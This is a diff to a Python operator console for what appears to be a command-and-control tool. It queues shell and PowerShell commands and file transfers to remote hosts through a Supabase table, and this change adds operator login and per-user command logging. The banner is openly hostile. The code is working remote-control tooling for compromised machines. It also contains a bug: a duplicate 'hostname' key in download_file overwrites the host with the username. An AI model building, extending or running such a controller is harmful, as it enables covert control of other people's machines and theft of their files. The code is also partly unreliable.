@@ -2,6 +2,9 @@ import time
 import itertools
 import readline
 import os
+import getpass
+import hashlib
+import bcrypt
 import requests # import the requests library
 from datetime import datetime, timedelta
 from supabase import create_client, Client
@@ -71,11 +74,12 @@ def select_hostname():
     return selected_host
 
 
-def download_file(hostname, file_path):
+def download_file(hostname, file_path, username):
     """Download a file from a specific host by inserting a 'download' command."""
     print(f"Requesting download of '{file_path}' from {hostname}...")
     result = supabase.table('py2').insert({
         'hostname': hostname,
+        'hostname': username,
         'command': f"download {file_path}",
         'status': 'Pending'
     }).execute()
@@ -179,7 +183,7 @@ def get_public_url(bucket_name, file_path):
     """Constructs the public URL for a file in Supabase storage."""
     return f"https://{SUPABASE_URL.split('//')[1]}/storage/v1/object/{bucket_name}/{file_path}"
 
-def upload_file(hostname, local_path, remote_path):
+def upload_file(hostname, local_path, remote_path, username):
     """Uploads a file to the specified host via Supabase storage."""
     bucket_name = "files"
     try:
@@ -212,6 +216,7 @@ def upload_file(hostname, local_path, remote_path):
             'local_path': local_path,
             'remote_path': remote_path,  # Store the full path for downloading
             'file_url': file_url,
+            'username': username,
             'timestamp': datetime.utcnow().isoformat(),
             'status': 'pending'  # Add a status field to track download status
         }).execute()
@@ -219,11 +224,12 @@ def upload_file(hostname, local_path, remote_path):
     except Exception as e:
         print(f"Upload failed: {e}")
 
-def send_command_and_get_output(hostname):
-    """Interactively send commands to a specific host and print the output."""
+def send_command_and_get_output(hostname, username):
+    """Interactively send commands to a specific host and print the output, while logging the user who issued them."""
     global current_sleep_interval
 
     print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
+    print(f"Commands are being issued by user: {username}")
 
     while True:
         command_text = input("\nEnter a command to send: ").strip().lower()
@@ -244,14 +250,11 @@ def send_command_and_get_output(hostname):
             print("Returning to the main menu.")
             break
 
-        # Handle 'psls' with potential arguments
+        # Handle specific commands with additional arguments or options
         if command_text.startswith("psls "):
             args = command_text[5:]  # Extract arguments after "psls "
             command_text = f"powershell ls {args}"
-
-
-        # Special handling for 'ps grep'
-        if command_text.startswith('ps grep'):
+        elif command_text.startswith('ps grep'):
             try:
                 _, _, pattern = command_text.split(maxsplit=2)
                 command_text = f"powershell -Command \"Get-Process | Where-Object {{$_.ProcessName -like '*{pattern}*'}}\""
@@ -275,16 +278,17 @@ def send_command_and_get_output(hostname):
                 continue
         elif command_text.startswith("upload"):
             try:
-                _, local_path, remote_path = command_text.split()
-                upload_file(hostname, local_path, remote_path)
+                _, local_path, remote_path = command_text.split(maxsplit=2)
+                upload_file(hostname, local_path, remote_path, username)  # Include username parameter
                 continue
             except ValueError:
                 print("Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                 continue
 
-        # Insert command into database
+        # Insert command into database with user tracking
         result = supabase.table('py2').insert({
             'hostname': hostname,
+            'username': username,  # Logging the username with the command
             'command': command_text,
             'status': 'Pending'
         }).execute()
@@ -311,6 +315,40 @@ def send_command_and_get_output(hostname):
                     print(f"\n\n{BLUE}Output:{RESET} from {GREEN}{hostname}{RESET}\n\n {output}")
                 break
 
+def login():
+    username = input("Enter your username: ")
+    password = getpass.getpass("Enter your password: ")  # Safely input password
+
+    # Fetch the stored hashed password from the database
+    user = supabase.table("users").select("password_hash").eq("username", username).execute().data
+
+    if not user:
+        print(f"{RED}Invalid username.{RESET}")
+        return None
+
+    stored_password_hash = user[0]['password_hash'].encode()
+
+    # Verify the entered password against the stored hash
+    if bcrypt.checkpw(password.encode(), stored_password_hash):
+        print(f"{GREEN}Login successful!{RESET}")
+        return username
+    else:
+        print(f"{RED}Invalid password.{RESET}")
+        return None
+
+def update_last_loggedin(username):
+    """Updates the last logged-in timestamp for a given user."""
+    current_time = datetime.utcnow()
+    # Execute the update query to set last_loggedin to the current timestamp
+    response = supabase.table("users").update({
+        'last_loggedin': current_time.isoformat()
+    }).eq('username', username).execute()
+
+    if response.error:
+        print(f"Failed to update last login time: {response.error}")
+    else:
+        print("Last login time updated successfully.")
+
 def main():
     print("\n░▒▓███████▓▒░ ░▒▓██████▓▒░ ░▒▓██████▓▒░        ░▒▓██████▓▒░░▒▓███████▓▒░")
     print("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░")
@@ -321,10 +359,15 @@ def main():
     print("░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓████████▓▒░\n")
     print("byte the shit out you - written completely by chatgpt\n")
 
+    username = login()  # Attempt to log in
+    if username is None:
+        print("Login failed. Exiting the application.")
+        return
+
     hostname = select_hostname()
 
     while hostname:
-        print(f"\nInteracting with '{GREEN}{hostname}{RESET}'\n")
+        print(f"\nInteracting with '{GREEN}{hostname}{RESET}' with user '{username}'\n")
         print("1. Interact")
         print("2. Exit to Host Selection")
         print("3. Exit to Local Terminal")
@@ -337,17 +380,15 @@ def main():
             continue
 
         if choice == 1:
-            send_command_and_get_output(hostname)
+            send_command_and_get_output(hostname, username)
         elif choice == 2:
             print("Returning to host selection, validating host status...")
             hostname = select_hostname()
-            continue  # This continue is important to skip the rest of the loop and re-evaluate the while condition.
         elif choice == 3:
             print("Exiting to local terminal.")
-            break  # This breaks out of the while loop, thus terminating the interaction.
+            break
         elif choice == 4:
-            print("Listing downloaded files.")
-            list_and_download_files(hostname)  # Pass the current hostname directly
+            list_and_download_files(hostname)
         else:
             print("Invalid choice. Please try again.")
 
